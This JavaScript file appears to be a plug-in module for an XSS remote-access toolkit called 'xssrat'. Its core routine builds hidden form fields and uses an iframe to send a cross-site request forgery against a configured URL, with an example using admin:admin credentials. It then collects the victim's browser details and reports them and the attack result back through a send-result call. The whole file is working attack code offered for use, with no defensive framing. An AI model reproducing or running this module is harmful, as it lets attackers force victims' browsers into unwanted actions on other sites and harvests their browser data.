// JavaScript Document

// JavaScript Document
//rat.extend(true,rat.module.core,rat.module);
//core module has been extended from rat.module

rat.module.core = {
	config:{
		url:'http://site/api or http://admin:admin@site/api',
		method:'GET or POST',
		data:'name=xssrat&pass=111111'
	},
	phrase_fields:function(data){
		var s_data = data.split('&');
		var fields = [];
		for(key in s_data){
			f = s_data[key].split('=');
			fields[key] = {'type':'hidden', 'name':f[0], 'value':f[1]};
		}
		console.log(fields);
		return fields;
	},
	csrf_attack:function(){
		var fields = this.phrase_fields(this.config.data);
		rat.dom.createIframeXsrfForm(this.config.url,this.config.method,fields);
		this.config.data = escape(this.config.data);
		var csrf_res = {"config":this.config,"result":"Attack have sended!"}
		var details = rat.browser.getDetails();
		var details_ob = $.arrayToJSON(details);
		this.sendResult({"CSRF":csrf_res,"Browser Detail":details_ob});
	},
	exploit:function(){
		this.csrf_attack();
	}

};